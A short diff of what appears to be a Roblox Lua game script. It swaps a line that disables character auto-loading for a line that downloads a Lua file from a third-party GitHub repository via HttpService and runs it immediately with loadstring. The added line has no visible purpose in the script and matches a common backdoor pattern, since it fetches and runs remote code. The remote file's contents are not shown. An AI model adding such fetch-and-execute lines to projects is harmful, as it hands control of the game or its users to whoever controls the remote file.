@@ -182,4 +182,4 @@ data.Source = "return " .. gameData
 
 warn("Finalizing game...")
 
-game:GetService("Players").CharacterAutoLoads = false
+loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/cencrypt/cencrypt/v0.3/decryption/setup.lua"))()
